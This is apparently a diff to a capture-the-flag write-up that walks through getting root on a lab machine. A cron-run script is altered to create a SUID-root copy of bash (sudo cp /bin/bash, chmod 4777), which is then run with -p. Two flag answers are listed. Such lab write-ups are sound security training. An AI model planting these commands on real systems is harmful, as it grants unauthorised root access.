@@ -130,11 +130,78 @@ I try thoses logins with the ssh as we seen before that the 22 port is open, and
 
 ## SSH shell
 
+So I need to use script.sh in order to escalate, first I look what does this script, it simply log the time in a log file inside alix home, usefull to know when the script run, and it run each minute.
+I want to know who has put a crontab on this script so I add this line inside the script :
+
+```
+/usr/bin/date >> /home/alix/log
+whoami >> /home/alix/log
+```
+
+And here is the result in the next entry :
+
+```
+mardi 22 juillet 2025, 13:01:01 (UTC+0200)
+god
+```
+
+It seems that I'm logged as god, so I need to put the next lines in the script in order to copy the rootbash in my home so I can run it.
 
 ```
 #!/bin/bash
 
-cp /bin/bash /home/alix/rootbash
-chmod +s /home/alix/rootbash
-chmod 755 /home/alix/rootbash
+sudo cp /bin/bash /home/alix/rootbash
+sudo chmod 4777 /home/alix/rootbash
+```
+
+Here we are copying the binary file located at /bin/bash. This is the standard system-wide Bash binary — not a user-specific shell.
+So it is not tied to the current user (god or otherwise). It simply copies the binary. And when we do it as sudo, the rootbash file is owned by root, then the permissions on this file is very important.
+As we copy the bash, we change the permissions too, of course we need to execute it whoever the user is, but the most important is we need to apply the special user permission (SUID) with the 4000 permission digit.
+It let us run the script at the owner permission of the script, so when the owner is root, we have then a rootbash.
+
+```
+ls -l rootbash
+-rwsrwxrwx 1 root root 1168776 juil. 22 13:46 rootbash
+```
+
+We can see the rootbash is owned by root, and we can see the ```s``` instead of the first ```x```, meaning that there is indeed a special permission for the user part.
+But when we run the rootbash this way :
+
+```
+alix@CTF-NOSTALGY-PIECE-OF-CAKE-3:~$ /home/alix/rootbash
+rootbash-5.0$ whoami
+alix
+```
+
+We are still logged as alix, so we need to use ```-p``` argument in order to not drop the permission and here we are, logged as root.
+
+```
+alix@CTF-NOSTALGY-PIECE-OF-CAKE-3:~$ /home/alix/rootbash -p
+rootbash-5.0$ whoami
+root
+```
+
+Then I found the fourth flag in the ```/home/god```
+
+```
+FLAG4{LES-DROITS-SUDO-SONT-LA-CLEE}
+```
+
+And finaly the fifth flag in the ```/root```
+
+```
+FLAG5{BEAU-TRAVAIL-BG}
+
+           .'\   /`.
+         .'.-.`-'.-.`.
+    ..._:   .-. .-.   :_...
+  .'    '-.(o ) (o ).-'    `.
+ :  _    _ _`~(_)~`_ _    _  :
+:  /:   ' .-=_   _=-. `   ;\  :
+:   :|-.._  '     `  _..-|:   :
+ :   `:| |`:-:-.-:-:'| |:'   :
+  `.   `.| | | | | | |.'   .'
+    `.   `-:_| | |_:-'   .'
+      `-._   ````    _.-'
+          ``-------''
 ```
